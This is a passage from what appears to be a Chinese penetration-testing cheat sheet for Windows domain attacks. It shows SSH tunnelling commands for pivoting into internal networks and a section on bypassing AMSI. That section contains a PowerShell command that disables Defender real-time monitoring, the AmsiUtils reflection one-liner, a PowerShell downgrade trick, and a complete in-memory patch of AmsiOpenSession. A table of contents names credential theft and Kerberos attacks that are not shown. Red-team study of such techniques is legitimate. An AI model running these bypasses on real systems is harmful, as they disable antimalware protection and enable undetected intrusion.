<h4 id="0x03-SSH隧道"><a href="#0x03-SSH隧道" class="headerlink" title="0x03  SSH隧道"></a>0x03  SSH隧道</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh参数详解：</span><br><span class="line">    -C Enable compression 压缩数据传输</span><br><span class="line">    -q Quiet mode. 安静模式</span><br><span class="line">    -T Disable pseudo-tty allocation. 不占用 shell</span><br><span class="line">    -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">    -N Do not execute a remote command. 不执行远程命令，端口转发就用它</span><br><span class="line">    -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">    -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">    -D port 指定一个本地机器动态的应用程序端口转发. </span><br><span class="line">    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接</span><br></pre></td></tr></table></figure>

<h5 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h5><p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host</span><br></pre></td></tr></table></figure>

<p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span> root@<span class="number">139.196</span>.xx.xx</span><br></pre></td></tr></table></figure>

<p>工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。<br>数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</p>
<h5 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h5><p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [bind_addr:]remote1_port:host:port remote1</span><br></pre></td></tr></table></figure>

<p>假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R <span class="number">4444</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span> root@<span class="number">192.168</span><span class="number">.183</span><span class="number">.195</span></span><br></pre></td></tr></table></figure>

<p>此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口<br>工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。</p>
<p>这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。</p>
<p>要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用”GatewayPorts”项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。</p>
<h5 id="SSH动态转发-正向代理做动态的端口转发"><a href="#SSH动态转发-正向代理做动态的端口转发" class="headerlink" title="SSH动态转发,正向代理做动态的端口转发"></a>SSH动态转发,正向代理做动态的端口转发</h5><p>本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。</p>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D [bind_addr:]port remote</span><br></pre></td></tr></table></figure>

<p>这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。<br>在本地执行以下命令，并查看建立连接情况</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nfg -D <span class="number">3333</span> root@<span class="number">45.77</span>.xx.xx</span><br></pre></td></tr></table></figure>

<p>连接建立成功，设置浏览器到本地主机的3333端口</p>
<h5 id="SSH动态转发，正向代理进行单一的端口转发"><a href="#SSH动态转发，正向代理进行单一的端口转发" class="headerlink" title="SSH动态转发，正向代理进行单一的端口转发"></a>SSH动态转发，正向代理进行单一的端口转发</h5><p>利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上</p>
<p>访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利用。</p>
<p>语法格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1</span><br></pre></td></tr></table></figure>

<p>此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80</p>
<h1 id="16-Bypass-AMSI"><a href="#16-Bypass-AMSI" class="headerlink" title="16.Bypass AMSI"></a>16.Bypass AMSI</h1><p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/01/23/AMSI/">How to Bypass AMSI </a></p>
<p>管理员权限关闭amsi</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<h3 id="一键关闭AMSI"><a href="#一键关闭AMSI" class="headerlink" title="一键关闭AMSI"></a>一键关闭AMSI</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>

<p>被加黑了，可以混淆过</p>
<h3 id="powershell降级"><a href="#powershell降级" class="headerlink" title="powershell降级"></a>powershell降级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2   &#x2F;&#x2F;改变powershell运行版本</span><br></pre></td></tr></table></figure>



<h3 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;</span>AmsiOpenSession<span class="string">&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[Program]::Bypass()</span><br></pre></td></tr></table></figure>





<p>参考链接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NyDubh3&#x2F;Pentesting-Active-Directory-CN</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;Intranet_Penetration_Tips</span><br><span class="line">https:&#x2F;&#x2F;0range-x.github.io&#x2F;2022&#x2F;01&#x2F;26&#x2F;Domain-penetration_one-stop&#x2F;</span><br></pre></td></tr></table></figure>













































































































</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Nice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/">http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://nice759.com" target="_blank">Nice's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/17/APP%E6%B8%97%E9%80%8F%EF%BC%9ABP%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%937+HTTPS%E6%B5%81%E9%87%8F/"><img class="prev-cover" src="https://s2.loli.net/2022/03/17/98dEqcKGSjoDFYh.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">APP渗透：BP抓取安卓7+HTTPS流量</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/26/Dedecmsv5.8%20SQL%20Injection/"><img class="next-cover" src="https://img.imgdb.cn/item/605d9f508322e6675c6bbb26.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Dedecms background SQL injection vulnerability</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Nice</div><div class="author-info__description">E-mail:1452165544@qq.com</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div><div class="card-info-data-item is-center"><a href="/Categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">声明：本博客所有内容均用于学习研究，请勿用于非法用途，后果自负！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%97%A0%E5%87%AD%E8%AF%81%E6%83%85%E5%86%B5%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text">1.无凭证情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">网络扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞快速探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A5%E6%9C%89%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text">拥有本地管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.1.</span> <span class="toc-text">获取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87LSA%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text">绕过LSA防护策略读取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.3.</span> <span class="toc-text">token窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.4.</span> <span class="toc-text">查看本地存储的所有密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%EF%BC%88%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%89%80%E6%9C%89hash%EF%BC%89"><span class="toc-number">1.4.5.</span> <span class="toc-text">卷影拷贝（获取域控所有hash）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dpapi%E8%A7%A3%E5%AF%86"><span class="toc-number">1.4.6.</span> <span class="toc-text">dpapi解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2.内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">8.获取当前用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Navicat%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">Navicat密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xshell-amp-xftp%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">xshell&amp;xftp密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mRemoteNG%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.6.</span> <span class="toc-text">mRemoteNG密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">扩散信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text">常用端口扫描工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">内网拓扑架构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.3.</span> <span class="toc-text">常见信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">第三方信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">3.获取域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SYSVOL"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">SYSVOL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MS14-068-Kerberos"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text">MS14-068 Kerberos</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SPN%E6%89%AB%E6%8F%8F"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text">SPN扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8"><span class="toc-number">3.0.0.0.4.</span> <span class="toc-text">Kerberos的黄金门票</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1"><span class="toc-number">3.0.0.0.5.</span> <span class="toc-text">Kerberos的银票务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.0.0.0.6.</span> <span class="toc-text">域服务账号破解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83"><span class="toc-number">3.0.0.0.7.</span> <span class="toc-text">凭证盗窃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NTLM-relay"><span class="toc-number">3.0.0.0.8.</span> <span class="toc-text">NTLM relay</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberos%E5%A7%94%E6%B4%BE"><span class="toc-number">3.0.0.0.9.</span> <span class="toc-text">Kerberos委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.0.0.0.10.</span> <span class="toc-text">地址解析协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zerologon%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.0.0.11.</span> <span class="toc-text">zerologon漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-42278-amp-amp-CVE-2021-42287"><span class="toc-number">3.0.0.0.12.</span> <span class="toc-text">CVE-2021-42278 &amp;&amp; CVE-2021-42287</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%88%97%E5%87%BA%E5%8F%AF%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E7%9A%84SMB%E5%85%B1%E4%BA%AB"><span class="toc-number">4.</span> <span class="toc-text">4.列出可匿名访问的SMB共享</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E6%9E%9A%E4%B8%BELDAP"><span class="toc-number">5.</span> <span class="toc-text">5.枚举LDAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%9F%A5%E6%89%BE%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text">6.查找用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%B4%A6%E5%8F%B7%EF%BC%8C%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">得到账号，但是没有密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">6.1.1.</span> <span class="toc-text">密码喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASREP-Roasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.2.</span> <span class="toc-text">ASREP-Roasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ASREP-Roastable%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.1.2.2.</span> <span class="toc-text">获取ASREP-Roastable账号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%BB%BB%E6%84%8F%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">拿到任意一个域用户的账号密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.1.</span> <span class="toc-text">获取其他账户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%B4%A6%E6%88%B7%E5%90%8D"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">1.获取域内所有账户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9E%9A%E4%B8%BE-SMB-%E5%85%B1%E4%BA%AB"><span class="toc-number">6.2.1.2.</span> <span class="toc-text">2.枚举 SMB 共享</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-bloodhound"><span class="toc-number">6.2.1.3.</span> <span class="toc-text">3.bloodhound</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-powerview-pywerview"><span class="toc-number">6.2.1.4.</span> <span class="toc-text">4.powerview &#x2F; pywerview</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.2.2.</span> <span class="toc-text">Kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash-1"><span class="toc-number">6.2.2.1.</span> <span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE-kerberoastable-%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.2.2.2.</span> <span class="toc-text">查找 kerberoastable 账号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">6.2.3.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintNightmare"><span class="toc-number">6.2.4.</span> <span class="toc-text">PrintNightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.5.</span> <span class="toc-text">枚举 DNS 服务器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-relay-poisoning%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text">7.relay&#x2F;poisoning攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%B2%A1%E5%BC%80%E5%90%AFSMB%E7%AD%BE%E5%90%8D%E7%9A%84%E6%9C%BA%E5%99%A8"><span class="toc-number">7.0.1.</span> <span class="toc-text">扫描没开启SMB签名的机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PetitPotam"><span class="toc-number">7.0.2.</span> <span class="toc-text">PetitPotam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">7.0.3.</span> <span class="toc-text">监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0SMB%E7%AD%BE%E5%90%8D-%E5%BC%80%E5%90%AFIPv6-ADCS"><span class="toc-number">7.1.</span> <span class="toc-text">无SMB签名 || 开启IPv6 || ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MS08-068"><span class="toc-number">7.1.1.</span> <span class="toc-text">1.MS08-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-mitm6-i-eth0-d"><span class="toc-number">7.1.2.</span> <span 